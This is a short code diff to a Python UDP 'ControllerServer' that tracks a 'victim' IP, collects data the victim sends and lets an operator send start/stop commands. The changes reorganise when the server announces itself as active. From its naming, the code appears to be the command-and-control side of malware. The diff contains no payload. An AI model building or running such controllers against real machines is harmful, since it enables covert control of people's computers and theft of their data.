@@ -97,18 +97,20 @@ class ControllerServer:
                     signal = data.get("signal", False)
                     ip_victim = data.get("from_ip", None)
 
-                    if self.ip_victim is None or self.ip_victim != ip_victim:
-                        self.ip_victim = ip_victim
-                        self.send_command(message="Server_active")
-                        print(f"UDP server listening on {self.ip_victim}:{self.port_listen} (press Ctrl+C to stop)")
-                        self.info_victim = data_str
-                        print(data_str)
-                        import time
-                        time.sleep(0.2)
+                    self.ip_victim = ip_victim
 
-                    print(self.info_victim)
-                    if self.ip_victim is None:
-                        continue
+                    # if self.ip_victim is None or self.ip_victim != ip_victim:
+                    #     self.ip_victim = ip_victim
+                    #     self.send_command(message="Server_active")
+                    #     print(f"UDP server listening on {self.ip_victim}:{self.port_listen} (press Ctrl+C to stop)")
+                    #     self.info_victim = data_str
+                    #     print(data_str)
+                    #     import time
+                    #     time.sleep(0.2)
+
+                    # print(self.info_victim)
+                    # if self.ip_victim is None:
+                    #     continue
 
                     if signal:
                         self.buffer += data_str
@@ -140,6 +142,10 @@ def main():
     listener_thread.start()
     print("\033[32m" + banner + "\033[0m")
     while True:
+        if controller.ip_victim is None:
+            controller.send_command(message="Server_active")
+            print(f"UDP server listening on {controller.ip_victim}:{controller.port_listen} (press Ctrl+C to stop)")
+
         command = input("Send cmd (start/stop/exit): ").strip().lower()
         if command == "start":
             controller.send_command(command)
